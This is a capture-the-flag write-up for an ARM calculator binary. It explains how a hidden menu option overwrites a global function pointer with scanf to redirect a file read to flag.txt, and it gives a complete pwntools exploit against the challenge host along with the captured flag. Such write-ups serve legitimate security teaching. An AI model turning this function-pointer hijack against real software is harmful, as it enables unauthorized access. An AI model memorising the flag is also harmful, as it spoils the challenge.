# secure-prototype

## Challenge

The challenge is a 32-bit ARM binary which serves as a calculator application.

We can select an option by entering a number.
For each option except "stop" and "help", we are prompted to give 3 integer parameters.

```
Welcome to the new and tops3cr3t stonkz calculator, we can show you information about old stonkz or calculate stonkz based on your assets
What do you want to do?
(1 will help you)
>>>1

----------------------------------------------------------------
| Help Menu:                                                    |
| Each action is associated with an id                          |
| Just give me an id and necessary values                       |
|--------------------------------------------------------------|
|ID     | ACTION                | PARAMS                        |
|0      | stop                  | no params                     |
|1      | help                  | no params                     |
|16     | change calc           | 3 params                      |
|32     | print stonks          | 3 params                      |
|48     | show old stonks       | 3 params                      |
|4919   | calc stonks           | 3 params                      |
|--------------------------------------------------------------|
>>>
```

### Mitigations

```
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
```

## Solution

Every loop, a global filename string is set to "stonks.txt" if it was not already set.

The "show old stonks" option will print the file contents of the file given by the above filename variable.

By disassembling the binary, we can see that there is a hidden option, with the id 0x420.
This calls a helper function that is used by the "change calc" option.
The function sets a global function pointer to a given parameter.
This pointer called by the "calc stonks" option, which passes it our first 2 parameters.

We can use this hidden option to change the function pointer to `scanf`.
Then we can call "calc stonks" and pass a `"%s"` string as our first argument, and the address of the filename global as our second argument.

This will prompt us to enter a filename, which will be "flag.txt".

Now, if we call "show old stonks", the program will print the flag.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host flu.xxx --port 20040 public/challenge.elf
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('public/challenge.elf')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'flu.xxx'
port = int(args.PORT or 20040)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     arm-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x10000)

io = start()

io.sendlineafter(b">>>", str(0x420).encode())
io.sendlineafter(
        b"please gimme your 3 parameters:\n>>>",
        " ".join([str(exe.sym["__isoc99_scanf"]), "1337", "1337"]).encode()
        )

io.sendlineafter(b">>>", str(0x1337).encode())
io.sendlineafter(
        b"please gimme your 3 parameters:\n>>>",
        " ".join([str(next(exe.search(b"%s\x00"))), str(0x22058), "1337"]).encode()
        )

io.sendline(b"flag.txt")
io.sendlineafter(b">>>", str(0x30).encode())
io.sendlineafter(b"please gimme your 3 parameters:\n", b"1337 1337 1337")

io.interactive()
```

## Flag

`flag{gl0bal_st0nkz_and_gl0bal_var1abl3}`

